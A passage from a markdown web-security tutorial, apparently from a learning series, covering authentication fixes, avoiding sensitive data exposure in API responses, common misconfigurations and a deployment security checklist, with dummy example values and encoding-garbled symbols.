âŒ No rate limiting on the login endpoint

âœ… Fixes:
  Hash passwords with bcrypt or Argon2 (not MD5 or SHA1)
  Lock accounts after 5 failed attempts (with exponential backoff)
  JWT tokens expire in 15 minutes (use refresh tokens for long sessions)
  Rate limit login: max 5 attempts per minute per IP
  Use MFA for sensitive accounts
```

---

### Sensitive Data Exposure â€” accidentally leaking private info

```
Bad API response:
{
  "id": 42,
  "name": "Alice",
  "email": "alice@gmail.com",
  "password_hash": "$2b$12$abc...",   â† NEVER return this
  "credit_card": "4111111111111111",   â† NEVER return this
  "internal_admin_flag": true,         â† should not exist in response
  "ssn": "123-45-6789"                 â† absolutely not
}

Good API response:
{
  "id": 42,
  "name": "Alice",
  "email": "alice@gmail.com"
  (only what the client actually needs for this endpoint)
}
```

**Fix:** Each API endpoint should return a DTO (Data Transfer Object) shaped specifically for that endpoint â€” not the raw database row.

---

### Security Misconfiguration â€” the most avoidable vulnerabilities

```
Common misconfigurations:
  âŒ Default admin credentials not changed (admin / admin)
  âŒ Debug mode left on in production (exposes stack traces and internals)
  âŒ S3 buckets set to public when they should be private
  âŒ Unnecessary ports left open (SSH from the whole internet)
  âŒ Error messages that show database column names or file paths
  âŒ Old, vulnerable library versions not updated

Fixes:
  âœ… Security checklist before every deployment
  âœ… Automated vulnerability scanning in CI/CD (npm audit, Dependabot)
  âœ… Error messages show only what's useful to the user â€” never internals
  âœ… Least privilege for every service and config (not "open everything")
```

---

### The security checklist â€” a quick reference

```
Authentication:
  â˜ Passwords hashed with bcrypt or Argon2 (never MD5, never plain text)
  â˜ Account lockout after failed attempts + rate limiting on login
  â˜ JWT tokens have short expiry (15 min to 1 hour)
  â˜ Refresh tokens rotated on each use
  â˜ MFA available for sensitive accounts

Data protection:
  â˜ HTTPS everywhere (force redirect from HTTP â†’ HTTPS)
  â˜ Sensitive data encrypted at rest (database-level encryption)
  â˜ API returns only the fields needed for each endpoint
  â˜ No secrets hardcoded in source code (use env vars or a secrets manager)

Input handling:
  â˜ Parameterised queries everywhere (zero SQL concatenation)
  â˜ All user input escaped/encoded before rendering in HTML
  â˜ File upload validation (check actual file type, not just extension)
  â˜ Request size limits (reject payloads over a few MB)

Infrastructure:
  â˜ No default credentials left unchanged
  â˜ Firewall: only required ports open
  â˜ Regular dependency updates
  â˜ Container images scanned for CVEs before deployment

Monitoring:
  â˜ Log all auth events (successful logins, failures, logouts)
  â˜ Alert on suspicious patterns (100 failed logins in a minute)
  â˜ Audit log for sensitive actions (who accessed what, when)
```

---

```
â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—
â•‘                                                               â•‘
â•‘   The best system is the simplest one that solves            â•‘
â•‘   your problem today. Not the one designed for a             â•‘
â•‘   scale you may never reach.                                 â•‘
â•‘                                                              â•‘
â•‘   Start simple. Scale when the pain is real.                 â•‘
â•‘   Complexity is a cost, not a feature.                       â•‘
â•‘                                                               â•‘
â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
```

---

_Part of the AI_Projects learning series._